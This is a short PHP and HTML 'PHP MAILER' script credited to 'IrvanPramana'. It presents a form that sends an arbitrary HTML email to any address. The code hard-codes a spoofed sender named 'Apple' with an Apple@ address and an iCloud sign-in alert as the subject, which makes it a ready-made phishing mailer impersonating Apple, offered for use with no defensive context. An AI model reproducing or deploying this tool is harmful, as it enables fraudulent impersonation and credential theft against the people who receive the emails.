<body 
<html> <head>
<style>
.mainContent {
    width: 39%;
    margin: 2.9em auto;
    background: #fff;
    padding: 2.9em;
}
</style>
 </head>
<body> 
<div class="mainContent">
    <h2>PHP MAILER/ <small><a href="https://garudatersakti72.id">Garuda Tersakti 72</a></small></h2>
<form action="#" method="get">
 <input type="text" name="email" placeholder="masukan email"></input><br/>
<p><textarea name="pesan" placeholder="Pesan anda" rows="7" cols="50" required>Support letter format html</textarea>
 <input type="submit" name="submit" value="Submit"></input>
</form>
</body>
</html>

<body bgcolor="black"> 
<?php 
//--------------------------
//©Coder IrvanPramana @2019
//--------------------------
$name = "Apple"; $to = $_GET ['email']; $web="$_SERVER[HTTP_HOST]"; 
$subject = "Your Apple ID was used to sign in to iCloud via a web browser"; 
$body = $_GET ['pesan'];
$email = "Apple@$web"; 
$headers = 'From: ' .
$email . "\r\n". 
$headers = "Content-type: text/html\r\n"; 'Reply-To: ' . 
$email. "\r\n" . 'X-Mailer: PHP/' . phpversion(); 
if (mail($to,
$subject,
$body,
$headers,$name))
 {  echo("<font color=green>This Email Sended To => $to </font>"); 
} else 
{ 
echo("<font color=red>This Server Not Support For Mailer</font>"); } ?>
